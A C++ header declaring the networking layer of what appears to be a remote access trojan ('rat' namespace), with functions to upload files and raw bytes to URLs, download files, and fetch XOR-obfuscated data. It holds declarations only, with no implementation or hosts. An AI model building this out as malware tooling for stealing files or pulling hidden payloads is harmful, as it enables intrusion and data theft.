#pragma once

#include <cstring>
#include <string>
#include <array>
#include <vector>
#include <cstdlib>
#include <chrono>
#include <filesystem>
#include <curl/curl.h>

namespace rat::networking {

enum class NetworkingResponseStatus {
    FILE_CREATION_FAILURE,
    INVALID_URL,
    CONNECTION_FAILURE,
    UNKNOWN_FAILURE,
    SUCCESS
};

struct NetworkingResponse {
    NetworkingResponseStatus status;
    std::chrono::milliseconds duration;
};

std::filesystem::path _getFilePathFromUrl(const std::string& arg_Url);

// === Public API ===
/*takes a url downloads the file to the file path, straight forward*/
NetworkingResponse downloadFile(const std::string& arg_Url,
                                 const std::filesystem::path& File_Path);

/*takes a file path uploads to the url given, straight forward*/
NetworkingResponse uploadFile(const std::filesystem::path& File_Path,
                               const std::string& arg_Url);

/*Uploads mime file types*/
NetworkingResponse uploadMimeFile(const std::filesystem::path& File_Path,
                                  const std::string& arg_Url,
                                  const std::string& Field_Name,
                                  const std::string& Mime_Type = "") ;

/*Uploads the mime file as raw bytes*/
NetworkingResponse uploadMimeRawBytes(const uint8_t* p_Raw_Bytes, 
                                  const size_t Data_Size, 
                                  const std::string& arg_Url, 
                                  const std::string& Mime_Type = "" );


/*returns an empty {} vector when the request fails */
std::vector<char> sendHttpRequest(const std::string& arg_Url);

/*Returns the actual bytes written into the buffer, rights into the buffer, */
size_t sendHttpRequest(const std::string& arg_Url, char* Response_Buffer, size_t Response_Buffer_Size);

bool downloadData(const std::string& arg_Url, std::vector<uint8_t>& Out_Buffer);

bool downloadDataIntoBuffer(const std::string& arg_Url, std::vector<uint8_t> Data_Vector);
bool downloadDataObfuscatedWithXor(const std::string& arg_Url,
                                   std::vector<uint8_t>& Out_Buffer,
                                   const char* Xor_Key);
} // namespace rat::networking
